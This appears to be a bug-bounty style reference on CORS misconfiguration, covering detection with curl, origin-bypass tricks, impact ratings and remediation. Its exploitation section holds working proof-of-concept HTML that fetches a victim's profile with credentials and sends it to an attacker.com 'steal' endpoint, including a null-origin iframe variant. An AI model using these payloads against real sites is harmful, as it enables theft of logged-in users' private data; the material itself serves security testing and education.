# CORS — Cross-Origin Resource Sharing Misconfiguration

**CWE:** CWE-942 | **OWASP:** A05:2021

> A misconfigured CORS policy can allow any attacker-controlled website to make authenticated API calls as a logged-in victim, reading their private data silently.

---

## How CORS Works

A browser enforces the Same-Origin Policy — origins can't read each other's responses by default.

CORS lets servers opt-in to cross-origin access via response headers:

```
Access-Control-Allow-Origin: https://trusted.com
Access-Control-Allow-Credentials: true
```

**Dangerous combination:** `Allow-Origin` reflects attacker origin + `Allow-Credentials: true`

---

## Detection

```bash
# Send Origin header and check response
curl -sI \
  -H "Origin: https://evil.com" \
  "https://target.com/api/user/profile" | \
  grep -i "access-control"

# Check for credential reflection
curl -sI \
  -H "Origin: https://evil.com" \
  -H "Cookie: session=YOUR_TOKEN" \
  "https://target.com/api/sensitive" | \
  grep -i "access-control"

# Automated scan
python3 Corsy.py -u https://target.com -t 10 --headers "Cookie: session=TOKEN"
python3 CORScanner.py -u https://target.com -v
```

---

## CORS Bypass Techniques

### Origin Reflection
```bash
# Server blindly reflects whatever Origin you send
Request:   Origin: https://evil.com
Response:  Access-Control-Allow-Origin: https://evil.com
           Access-Control-Allow-Credentials: true
# → CRITICAL: Full ATO via cross-origin reads
```

### Null Origin
```bash
# Some servers allow null origin (sandbox iframes)
Request:   Origin: null
Response:  Access-Control-Allow-Origin: null
           Access-Control-Allow-Credentials: true
# → Exploit via sandboxed iframe
```

### Prefix/Suffix Bypass
```bash
# Server validates prefix only
# Policy intends: *.target.com
# You try: evil-target.com
Request:   Origin: https://evil-target.com
Response:  Access-Control-Allow-Origin: https://evil-target.com   # ← bug

# Suffix bypass
Request:   Origin: https://notrealtarget.com
# If policy checks for "target.com" anywhere in string
```

### Subdomain Takeover + CORS
```bash
# If CORS allows *.target.com and you own sub.target.com via takeover:
# Your sub.target.com can make authenticated API calls to api.target.com
# → Full data exfiltration on any logged-in user
```

### HTTP Downgrade
```bash
# Policy allows https://target.com
# Test:  Origin: http://target.com   (HTTP not HTTPS)
# Some servers misconfigure this
```

---

## Exploitation PoC

```html
<!-- Host this on attacker.com or null-origin sandbox -->
<!-- Reads victim's private profile data -->

<html>
<body>
<script>
  fetch('https://target.com/api/user/profile', {
    method: 'GET',
    credentials: 'include'   // sends victim's cookies
  })
  .then(r => r.json())
  .then(data => {
    // Exfiltrate data
    fetch('https://attacker.com/steal?d=' + btoa(JSON.stringify(data)));
  });
</script>
</body>
</html>
```

**For null origin (sandboxed iframe):**
```html
<iframe sandbox="allow-scripts allow-top-navigation allow-forms" 
        srcdoc='<script>
          fetch("https://target.com/api/user/profile", {credentials:"include"})
          .then(r=>r.json())
          .then(d=>location="https://attacker.com/steal?d="+btoa(JSON.stringify(d)))
        </script>'>
</iframe>
```

---

## Common CORS Vulnerable Endpoints

```
GET /api/user/profile         ← personal data
GET /api/account/settings     ← email, 2FA config
GET /api/billing/cards        ← payment info
GET /api/messages             ← private messages
GET /api/admin                ← admin-only data
POST /api/account/change-email ← state-changing (worse than read)
```

---

## CORS vs CSRF

Both are cross-origin attacks but different:

**CORS misconfiguration** — attacker reads the *response* (data theft). Requires `credentials: true`.

**CSRF** — attacker triggers a *state change* (no response reading needed). Works without CORS misconfiguration.

---

## Impact Assessment

**Reflects arbitrary origin + credentials: true** → Critical (full account data theft)

**Reflects null origin + credentials: true** → High

**Reflects trusted subdomain you control (via takeover) + credentials: true** → Critical

**Allows cross-origin reads but no credentials** → Low/Informational (no session = no sensitive data)

**Allows cross-origin writes (simple requests only)** → Medium (CSRF-equivalent)

---

## Remediation

```
1. Never reflect the Origin header value directly
2. Maintain an explicit allowlist of trusted origins
3. Only set Access-Control-Allow-Credentials: true when strictly necessary
4. Never use wildcard (*) with credentials
5. Validate Origin strictly including scheme (https vs http)
```
